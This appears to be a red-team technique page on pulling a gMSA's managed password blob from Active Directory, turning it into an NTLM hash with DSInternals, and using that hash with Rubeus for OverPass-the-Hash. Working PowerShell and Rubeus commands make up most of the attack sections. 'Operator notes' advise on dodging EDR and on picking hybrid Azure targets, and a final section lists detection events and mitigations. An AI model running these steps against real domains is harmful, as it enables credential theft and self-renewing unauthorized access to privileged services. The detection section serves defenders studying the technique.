## Overview

Group Managed Service Accounts (gMSA) have their passwords managed automatically by Active Directory — rotated every 30 days without administrative intervention. The current managed password is stored in the `msDS-ManagedPassword` attribute of the gMSA object in AD. Only principals listed in `PrincipalsAllowedToRetrieveManagedPassword` can read this attribute.

The offensive angle: compromising any one of those authorized principals allows reading the blob and deriving the current NTLM hash using DSInternals — a legitimate, open-source PowerShell module for AD security assessment. Because the blob can be re-read after each rotation using the same authorized principal, the access is self-renewing as long as that principal remains compromised.

## Why This Matters in Hybrid Environments

gMSAs running privileged services on AD-connected infrastructure often have broad permissions: DCSync rights, local admin on servers, access to sensitive file shares or databases. A gMSA hash obtained via blob extraction provides stable, long-lived access that doesn't depend on user session state, password knowledge, or a specific host.

## Preconditions

| Requirement | Detail |
|---|---|
| Authorized principal compromised | A user or machine account listed in `PrincipalsAllowedToRetrieveManagedPassword` |
| AD read access for that principal | The principal must be able to authenticate to AD and read the gMSA object |
| DSInternals module | Open-source PowerShell module for decoding managed password blobs |

DC machine accounts (`DOMAIN-DC$`) are frequently authorized to retrieve gMSA passwords — compromising a DC account via DCSync or OPtH enables gMSA blob extraction.

## Identifying gMSAs and Their Authorized Principals

```powershell
Import-Module ActiveDirectory

# List all gMSAs with their authorized retrievers
Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword, Description |
    Select-Object Name, SamAccountName, Description,
        @{n="AuthorizedPrincipals"; e={$_.PrincipalsAllowedToRetrieveManagedPassword}} | Format-List
```

If the compromised identity (or a machine account obtained via DCSync/OPtH) appears in `PrincipalsAllowedToRetrieveManagedPassword`, the blob is readable.

## Extracting the Blob and Deriving the Hash

Run from the context of the authorized principal:

```powershell
Import-Module ActiveDirectory
Import-Module DSInternals   # https://github.com/MichaelGrafnetter/DSInternals

# Read the managed password blob
$gmsa    = Get-ADServiceAccount -Identity <GMSA_NAME> -Properties msDS-ManagedPassword -Server <DOMAIN.CORP>
$blob    = $gmsa.'msDS-ManagedPassword'

# Decode blob and derive NTLM hash
$decoded = ConvertFrom-ADManagedPasswordBlob $blob
$hash    = ConvertTo-NTHash -Password $decoded.SecureCurrentPassword

Write-Host "Current NTLM hash: $hash"
# Previous password also available via $decoded.SecurePreviousPassword if rotation just occurred
```

## Using the Derived Hash

The NTLM hash of a gMSA can be used directly with OverPass-the-Hash to obtain a Kerberos TGT, then authenticate to any resource the gMSA has access to:

```powershell
# OPtH with Rubeus using the derived hash
.\Rubeus.exe asktgt /user:<GMSA_NAME>$ /domain:<DOMAIN.CORP> /rc4:<DERIVED_HASH> /dc:<DC-IP> /ptt
klist   # verify TGT issued for the gMSA account
```

## The Persistence Property

```
gMSA password rotation cycle (every 30 days):
  ├── AD updates msDS-ManagedPassword attribute
  ├── Previous hash is no longer valid for authentication
  └── BUT: blob can be re-read by the still-compromised authorized principal
        └── New hash derivable without any additional compromise
              └── Access self-renews indefinitely
```

The gMSA cannot have its "password" reset in the traditional sense — the blob update is automatic. The only remediation is removing the compromised principal from `PrincipalsAllowedToRetrieveManagedPassword` or recovering the authorized principal itself.

## Operator Notes

- DSInternals is a legitimate PowerShell module by Michael Grafnetter (Microsoft MVP), used for AD security assessment. It is flagged by some EDR products when loaded — consider execution context.
- The attribute `msDS-ManagedPassword` is only readable via LDAP by authorized principals. Unauthorized reads return `Access Denied` without logging an event (only the authorized read is logged).
- gMSAs can also be used directly as service identities on Azure-joined machines — hybrid configurations where the gMSA runs workloads that also have Azure resource access are particularly valuable targets.
- Map what Azure resources the gMSA has access to (via Graph and ARM) in addition to on-prem — the hash unlocks both planes if the gMSA has cross-plane permissions.

## Detection / Friction Points

- Event `4662` on the DC: access to the `msDS-ManagedPassword` attribute — actor, gMSA name, and timestamp are logged. This is the primary detection signal for blob extraction.
- DSInternals module load may generate AMSI or script block logging events if PowerShell logging is enabled.
- OPtH with RC4 for a service account that normally uses AES is anomalous — MDI and Defender for Identity flag this pattern.
- Mitigation: minimize the number of principals authorized to retrieve gMSA passwords; use just-in-time access for privileged principals; monitor `4662` events on high-value gMSA objects.
